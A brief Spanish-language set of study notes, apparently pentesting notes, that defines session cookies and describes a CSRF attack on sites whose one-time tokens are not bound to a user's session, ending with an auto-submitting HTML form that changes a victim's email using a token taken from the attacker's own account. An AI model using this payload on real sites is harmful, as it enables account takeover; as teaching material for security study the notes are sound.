## Que es una cookie session

Las cookies session son aquellas que nos identifican ante una pagina, y así poder tener una conexion constante a nombre de un usuario

## Ataque

 Usualmente cada usuario tiene un CSRF token ligado a su session, pero en algunos casos el CSRF token solo se genera aleatoriamente y es de un solo uso, pero esto sigue siendo muy inseguro, ya que en este caso podemos generar un CSRF token con nuestro usuario, y sin usarlo, hacer que la victima haga la petición usando ese CSRF token único, ==primero necesitamos obtener un CSRF token sin usar==, podemos hacerlo interceptando una petición, y ahora con este token, haremos el siguiente exploit en nuestro servidor de atacantes:

```html
<form method="GET" action="{URL_PAGINA_VICTIMA}">
	<input type="hidden" name="email" value="newemail@new.com">
	<input type="hidden" name="csrf" value="{CSRF_TOKEN}">
</form>
<script>
	document.forms[0].submit()
</script>
```